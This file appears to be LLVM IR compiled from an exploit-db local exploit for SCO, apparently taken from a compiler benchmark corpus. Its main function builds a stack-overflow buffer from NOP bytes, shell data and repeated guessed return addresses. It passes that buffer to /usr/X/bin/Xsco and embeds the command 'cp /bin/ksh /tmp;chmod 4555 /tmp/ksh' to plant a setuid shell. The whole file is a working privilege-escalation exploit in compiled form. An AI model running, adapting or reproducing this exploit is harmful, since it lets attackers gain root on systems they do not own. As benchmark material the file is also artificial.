; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/sco/local/extr_19641.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/sco/local/extr_19641.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [37 x i8] c"cp /bin/ksh /tmp;chmod 4555 /tmp/ksh\00", align 1
@buffer = common dso_local global i8* null, align 8
@x86_nop = common dso_local global i32 0, align 4
@SIZE = common dso_local global i32 0, align 4
@shell = common dso_local global i8* null, align 8
@LEN = common dso_local global i32 0, align 4
@offset = common dso_local global i32 0, align 4
@nop = common dso_local global i32 0, align 4
@esp = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [2 x i8] c"\FF\00", align 1
@.str.2 = private unnamed_addr constant [39 x i8] c"jmp = [0x%x]\09offset = [%d]\09nop = [%d]\0A\00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"/usr/X/bin/Xsco\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"Xsco\00", align 1
@.str.5 = private unnamed_addr constant [14 x i8] c"exec failed!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0), i8** %8, align 8
  %9 = load i8*, i8** @buffer, align 8
  %10 = load i32, i32* @x86_nop, align 4
  %11 = load i32, i32* @SIZE, align 4
  %12 = call i32 @memset(i8* %9, i32 %10, i32 %11)
  %13 = load i8*, i8** %8, align 8
  %14 = call i32 @strlen(i8* %13)
  store i32 %14, i32* %7, align 4
  %15 = load i32, i32* %7, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %7, align 4
  %17 = load i32, i32* %7, align 4
  %18 = sub nsw i32 0, %17
  store i32 %18, i32* %7, align 4
  %19 = load i32, i32* %7, align 4
  %20 = ashr i32 %19, 0
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  %23 = load i8*, i8** @shell, align 8
  %24 = load i32, i32* @LEN, align 4
  %25 = add nsw i32 %24, 0
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %23, i64 %26
  store i8 %22, i8* %27, align 1
  %28 = load i32, i32* %7, align 4
  %29 = ashr i32 %28, 8
  %30 = and i32 %29, 255
  %31 = trunc i32 %30 to i8
  %32 = load i8*, i8** @shell, align 8
  %33 = load i32, i32* @LEN, align 4
  %34 = add nsw i32 %33, 1
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %32, i64 %35
  store i8 %31, i8* %36, align 1
  %37 = load i32, i32* %7, align 4
  %38 = ashr i32 %37, 16
  %39 = and i32 %38, 255
  %40 = trunc i32 %39 to i8
  %41 = load i8*, i8** @shell, align 8
  %42 = load i32, i32* @LEN, align 4
  %43 = add nsw i32 %42, 2
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %41, i64 %44
  store i8 %40, i8* %45, align 1
  %46 = load i32, i32* %7, align 4
  %47 = ashr i32 %46, 24
  %48 = and i32 %47, 255
  %49 = trunc i32 %48 to i8
  %50 = load i8*, i8** @shell, align 8
  %51 = load i32, i32* @LEN, align 4
  %52 = add nsw i32 %51, 3
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  store i8 %49, i8* %54, align 1
  %55 = load i32, i32* %4, align 4
  %56 = icmp sgt i32 %55, 1
  br i1 %56, label %57, label %66

57:                                               ; preds = %2
  %58 = load i8**, i8*** %5, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 1
  %60 = load i8*, i8** %59, align 8
  %61 = call i64 @strtol(i8* %60, i32* null, i32 0)
  %62 = load i32, i32* @offset, align 4
  %63 = sext i32 %62 to i64
  %64 = add nsw i64 %63, %61
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* @offset, align 4
  br label %66

66:                                               ; preds = %57, %2
  %67 = load i32, i32* %4, align 4
  %68 = icmp sgt i32 %67, 2
  br i1 %68, label %69, label %78

69:                                               ; preds = %66
  %70 = load i8**, i8*** %5, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 2
  %72 = load i8*, i8** %71, align 8
  %73 = call i64 @strtoul(i8* %72, i32* null, i32 0)
  %74 = load i32, i32* @nop, align 4
  %75 = sext i32 %74 to i64
  %76 = add nsw i64 %75, %73
  %77 = trunc i64 %76 to i32
  store i32 %77, i32* @nop, align 4
  br label %78

78:                                               ; preds = %69, %66
  %79 = call i32 (...) @get_esp()
  store i32 %79, i32* @esp, align 4
  %80 = load i8*, i8** @buffer, align 8
  %81 = getelementptr inbounds i8, i8* %80, i64 0
  store i8 58, i8* %81, align 1
  %82 = load i8*, i8** @buffer, align 8
  %83 = load i32, i32* @nop, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i8*, i8** @shell, align 8
  %87 = load i8*, i8** @shell, align 8
  %88 = call i32 @strlen(i8* %87)
  %89 = call i32 @memcpy(i8* %85, i8* %86, i32 %88)
  %90 = load i8*, i8** @buffer, align 8
  %91 = load i32, i32* @nop, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8, i8* %90, i64 %92
  %94 = load i8*, i8** @shell, align 8
  %95 = call i32 @strlen(i8* %94)
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %93, i64 %96
  %98 = load i8*, i8** %8, align 8
  %99 = load i8*, i8** %8, align 8
  %100 = call i32 @strlen(i8* %99)
  %101 = call i32 @memcpy(i8* %97, i8* %98, i32 %100)
  %102 = load i8*, i8** @buffer, align 8
  %103 = load i32, i32* @nop, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8, i8* %102, i64 %104
  %106 = load i8*, i8** @shell, align 8
  %107 = call i32 @strlen(i8* %106)
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8, i8* %105, i64 %108
  %110 = load i8*, i8** %8, align 8
  %111 = call i32 @strlen(i8* %110)
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8, i8* %109, i64 %112
  %114 = call i32 @memcpy(i8* %113, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0), i32 1)
  %115 = load i32, i32* @nop, align 4
  %116 = load i8*, i8** @shell, align 8
  %117 = call i32 @strlen(i8* %116)
  %118 = add nsw i32 %115, %117
  %119 = add nsw i32 %118, 1
  %120 = load i8*, i8** %8, align 8
  %121 = call i32 @strlen(i8* %120)
  %122 = add nsw i32 %119, %121
  store i32 %122, i32* %6, align 4
  br label %123

123:                                              ; preds = %137, %78
  %124 = load i32, i32* %6, align 4
  %125 = load i32, i32* @SIZE, align 4
  %126 = sub nsw i32 %125, 4
  %127 = icmp slt i32 %124, %126
  br i1 %127, label %128, label %140

128:                                              ; preds = %123
  %129 = load i32, i32* @esp, align 4
  %130 = load i32, i32* @offset, align 4
  %131 = add nsw i32 %129, %130
  %132 = load i8*, i8** @buffer, align 8
  %133 = load i32, i32* %6, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds i8, i8* %132, i64 %134
  %136 = bitcast i8* %135 to i32*
  store i32 %131, i32* %136, align 4
  br label %137

137:                                              ; preds = %128
  %138 = load i32, i32* %6, align 4
  %139 = add nsw i32 %138, 4
  store i32 %139, i32* %6, align 4
  br label %123

140:                                              ; preds = %123
  %141 = load i32, i32* @esp, align 4
  %142 = load i32, i32* @offset, align 4
  %143 = add nsw i32 %141, %142
  %144 = load i32, i32* @offset, align 4
  %145 = load i32, i32* @nop, align 4
  %146 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.2, i64 0, i64 0), i32 %143, i32 %144, i32 %145)
  %147 = load i8*, i8** @buffer, align 8
  %148 = call i32 @execl(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i8* %147, i32* null)
  %149 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @strtol(i8*, i32*, i32) #1

declare dso_local i64 @strtoul(i8*, i32*, i32) #1

declare dso_local i32 @get_esp(...) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
